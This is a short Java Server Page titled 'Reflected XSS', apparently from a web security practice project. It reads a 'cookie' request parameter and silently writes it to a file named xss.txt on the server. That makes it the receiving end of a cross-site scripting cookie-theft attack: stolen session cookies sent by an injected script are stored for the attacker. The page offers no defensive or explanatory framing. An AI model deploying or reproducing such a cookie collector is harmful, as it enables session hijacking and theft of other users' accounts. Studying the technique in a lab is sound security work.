<%@ page language="java" contentType="text/html; charset=EUC-KR"
    pageEncoding="EUC-KR"%>
<%@ page import="java.io.*"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="EUC-KR">
<title>Reflected XSS</title>
</head>
<body>
	<%
	   File Text = new File("xss.txt");
	   String cookie = request.getParameter("cookie");
	   try{
		   FileWriter fw = new FileWriter("xss.txt", false);		   
		   BufferedWriter bw = new BufferedWriter(fw);
		   bw.write(cookie);
		   bw.close();
	   } catch (IOException e) {
		   e.printStackTrace();
	   }
	%>
</body>
</html>